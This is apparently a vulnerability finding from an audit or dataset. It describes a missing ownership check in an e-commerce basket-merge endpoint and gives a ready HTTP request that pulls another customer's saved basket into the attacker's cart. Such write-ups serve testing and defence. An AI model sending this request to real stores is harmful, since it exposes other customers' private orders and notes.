diagnosis: MergeSavedBasketView allows merging items from a saved wishlist or previous cart into an active basket. While it verifies target_basket.owner == request.user, it queries source_basket with status=Basket.SAVED without owner verification. An authenticated attacker can supply any user's source_basket_id to transfer products, customized configurations, and notes from other customers' saved baskets into their own cart.
exploit_request:
POST /api/basket/merge-saved/ HTTP/1.1
Host: store.luxurybrand.com
Authorization: Bearer attacker_auth_header
Content-Type: application/json

{
  "source_basket_id": 3109,
  "target_basket_id": 5518
}
